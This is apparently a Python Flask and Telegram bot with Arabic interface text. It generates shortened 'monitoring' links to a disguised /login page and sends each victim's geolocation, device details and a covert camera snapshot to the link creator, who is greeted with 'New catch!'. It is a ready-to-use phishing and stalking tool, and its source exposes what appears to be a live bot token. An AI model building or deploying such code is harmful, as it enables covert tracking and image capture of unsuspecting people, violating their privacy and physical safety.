import telebot
import requests
import base64
from flask import Flask, request, render_template

TOKEN = '8569672811:AAEqIzOyjxEpsh331Z9tYmZl1zhmjoJprjY'
CHANNEL_ID = '@DroidOnline2' 
BASE_URL = 'https://droidlink.vercel.app' # رابط فيرسيل الذي ستحصل عليه لاحقاً

bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

def shorten(url):
    try:
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}")
        return res.text if res.status_code == 200 else url
    except: return url

def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if not is_subscribed(user_id):
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("📢 اشترك أولاً", url=f"https://t.me/{CHANNEL_ID[1:]}"))
        bot.send_message(message.chat.id, "⚠️ اشترك بالقناة لتفعيل البوت!", reply_markup=markup)
        return
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("🇾🇪 Arabic", callback_data=f"ar_{user_id}"),
               telebot.types.InlineKeyboardButton("🇬🇧 English", callback_data=f"en_{user_id}"))
    bot.send_message(message.chat.id, "🌐 اختر لغتك / Choose Language:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.data.split('_')[-1]
    if "ar_" in call.data or "en_" in call.data:
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("➕ إنشاء رابط مراقبة", callback_data=f"gen_{user_id}"))
        bot.edit_message_text("✅ النظام جاهز، اضغط لإنشاء الرابط:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    elif "gen_" in call.data:
        short_link = shorten(f"{BASE_URL}/login?id={user_id}")
        bot.send_message(call.message.chat.id, f"✅ تم تجهيز رابطك:\n{short_link}\n\nتابعنا: {CHANNEL_ID}")

@app.route('/login')
def login():
    return render_template('index.html')

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.json
    owner_id = data['owner_id']
    bot.send_message(owner_id, f"🎯 صيد جديد!\n📍 الموقع: https://www.google.com/maps?q={data['loc']}\n📱 الجهاز: {data['dev']}")
    if 'img' in data:
        img_data = base64.b64decode(data['img'].split(',')[1])
        bot.send_photo(owner_id, img_data, caption="📸 لقطة الكاميرا")
    return "ok", 200

@app.route('/', methods=['POST'])
def webhook():
    bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode("utf-8"))])
    return "!", 200
